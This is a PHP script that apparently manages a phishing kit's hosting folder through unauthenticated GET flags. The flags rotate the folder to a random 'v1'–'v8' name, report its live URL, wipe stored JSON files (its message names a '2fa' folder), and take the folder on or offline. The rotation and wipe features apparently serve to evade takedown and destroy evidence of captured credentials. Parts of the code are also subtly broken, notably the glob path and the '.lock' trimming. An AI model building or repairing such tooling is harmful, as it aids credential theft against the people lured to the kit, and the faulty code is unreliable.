<?php

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET");
header("Content-Type: application/json");

$logFile = './data.log';
$directoryPrefix = 'v';

function logRequest($logFile, $message) {
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] $message" . PHP_EOL;
    file_put_contents($logFile, $logEntry, FILE_APPEND);
}

function findCurrentDirectory($prefix) {
    $directories = glob($prefix . '*');
    if (count($directories) > 0) {
        return $directories[0];
    }
    return null;
}

function getCurrentHostUrl($prefix) {
    $scheme = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $host = $_SERVER['HTTP_HOST'];
    $currentDirectory = findCurrentDirectory($prefix);
    $currentScriptDirectory = rtrim(dirname($_SERVER['SCRIPT_NAME']), '/');

    if ($currentDirectory) {
        $directoryName = basename($currentDirectory);
        return "$scheme://$host" . ($currentScriptDirectory ? "/$currentScriptDirectory" : '') . "/$directoryName/";
    }
    return "$scheme://$host" . ($currentScriptDirectory ? "/$currentScriptDirectory" : '') . "/";
}

function clearJsonFiles($currentDirectory) {
    $directories = [
        $currentDirectory . '/users/files',
        $currentDirectory . '/users/files2'
    ];

    foreach ($directories as $dir) {
        foreach (glob($dir . '*.json') as $file) {
            if (is_file($file)) {
                unlink($file);
            }
        }
    }
}

$requestUri = $_SERVER['REQUEST_URI'];
$method = $_SERVER['REQUEST_METHOD'];
$logMessage = "Method: $method, URI: $requestUri";
logRequest($logFile, $logMessage);

if (isset($_GET['rnd']) && $_GET['rnd'] === '!') {
    $currentDirectory = findCurrentDirectory($directoryPrefix);
    if ($currentDirectory) {
        $randomNumber = rand(1, 8);
        $newDirectoryPath = "./$directoryPrefix$randomNumber";

        if (rename($currentDirectory, $newDirectoryPath)) {
            echo json_encode(array(
                'status' => '200 OK',
                'new_directory' => basename($newDirectoryPath)
            ));
        } else {
            echo json_encode(array(
                'status' => '500 Internal Server Error',
                'message' => 'Failed to rename directory'
            ));
        }
    } else {
        echo json_encode(array(
            'status' => '404 Not Found',
            'message' => 'Directory not found'
        ));
    }
    exit;
}

if (isset($_GET['get']) && $_GET['get'] === '!') {
    $currentDirectory = findCurrentDirectory($directoryPrefix);
    $currentHostUrl = getCurrentHostUrl($directoryPrefix);
    if ($currentDirectory) {
        echo json_encode(array(
            'status' => '200 OK',
            'current_directory' => basename($currentDirectory),
            'current_url' => $currentHostUrl
        ));
    } else {
        echo json_encode(array(
            'status' => '404 Not Found',
            'message' => 'Directory not found',
            'current_url' => $currentHostUrl
        ));
    }
    exit;
}

if (isset($_GET['clr']) && $_GET['clr'] === '!') {
    $currentDirectory = findCurrentDirectory($directoryPrefix);
    if ($currentDirectory) {
        clearJsonFiles($currentDirectory);
        echo json_encode(array(
            'status' => '200 OK',
            'message' => 'All JSON files in /users/ and /users/2fa/ have been deleted'
        ));
    } else {
        echo json_encode(array(
            'status' => '404 Not Found',
            'message' => 'Directory not found'
        ));
    }
    exit;
}

if (isset($_GET['off']) && $_GET['off'] === '!') {
    $currentDirectory = findCurrentDirectory($directoryPrefix);
    if ($currentDirectory) {
        $lockedDirectory = $currentDirectory . '.lock';
        if (rename($currentDirectory, $lockedDirectory)) {
            echo json_encode(array(
                'status' => '200 OK',
                'message' => 'Directory locked',
                'locked_directory' => basename($lockedDirectory)
            ));
        } else {
            echo json_encode(array(
                'status' => '500 Internal Server Error',
                'message' => 'Failed to lock directory'
            ));
        }
    } else {
        echo json_encode(array(
            'status' => '404 Not Found',
            'message' => 'Directory not found'
        ));
    }
    exit;
}

if (isset($_GET['on']) && $_GET['on'] === '!') {
    $lockedDirectory = findCurrentDirectory($directoryPrefix . '*.lock');
    if ($lockedDirectory) {
        $originalDirectory = rtrim($lockedDirectory, '.lock');
        if (rename($lockedDirectory, $originalDirectory)) {
            echo json_encode(array(
                'status' => '200 OK',
                'message' => 'Directory unlocked',
                'unlocked_directory' => basename($originalDirectory)
            ));
        } else {
            echo json_encode(array(
                'status' => '500 Internal Server Error',
                'message' => 'Failed to unlock directory'
            ));
        }
    } else {
        echo json_encode(array(
            'status' => '404 Not Found',
            'message' => 'Locked directory not found'
        ));
    }
    exit;
}

if (isset($_GET['status'])) {
    echo json_encode(array(
        'status' => '200 OK'
    ));
} else {
    echo json_encode(array(
        'status' => '400 Bad Request'
    ));
}
?>

